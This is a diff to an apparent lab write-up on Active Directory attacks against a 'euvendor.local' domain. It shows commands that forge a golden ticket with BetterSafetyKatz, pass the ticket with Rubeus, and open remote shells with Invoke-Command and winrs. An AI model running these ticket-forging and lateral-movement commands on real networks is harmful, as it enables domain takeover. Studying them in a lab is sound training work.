@@ -197,7 +197,7 @@ C:\Users\Public\BetterSafetyKatz.exe "kerberos::golden /user:administrator /doma
 Then use `Rubeus.exe` to ptt:
 
 ```
-C:\Users\Public\Rubeus.exe asktgs /ticket:C:\Users\Public\euvendoreuadmin.kirbi /service:HTTP/euvendor-dc.euvendor.local,HOST/euvendor-dc.euvendor.local /dc:euvendor-dc.euvendor.local /ptt
+C:\Users\Public\Rubeus.exe asktgs /ticket:C:\Users\Public\euvendoreuadmin.kirbi /service:HTTP/euvendor-net.euvendor.local,HOST/euvendor-net.euvendor.local /dc:euvendor-dc.euvendor.local /ptt
 ```
 
 ![picture 13](images/55e82334c5dda12b0b4d0fdb58629187e9e9a909f42602c155f1a41a348c9368.png)  
@@ -216,6 +216,18 @@ Get-ADComputer -Filter * -Server euvendor.local | Select name
 Invoke-Command -Scriptblock {hostname; whoami} -ComputerName euvendor-net.euvendor.local -Authentication NegotiateWithImplicitCredential
 ```
 
+![picture 15](images/032f69407eb3bf2af05a62e69ad4acba6338ac4998b84fd8596302000dd240f2.png)  
+
+
+<br/>
+
+
+Try to get a powershell session on `euvendor-net`:
+
 ```
-winrs -r:euvendor-net.euvendor.local cmd.exe
+winrs -r:euvendor-net.euvendor.local powershell.exe
 ```
+
+![picture 16](images/ff4ae45ff66cf0a67be61f83b9aaa2977d446fe086933e9860d76784bb1cd7d7.png)  
+
+---
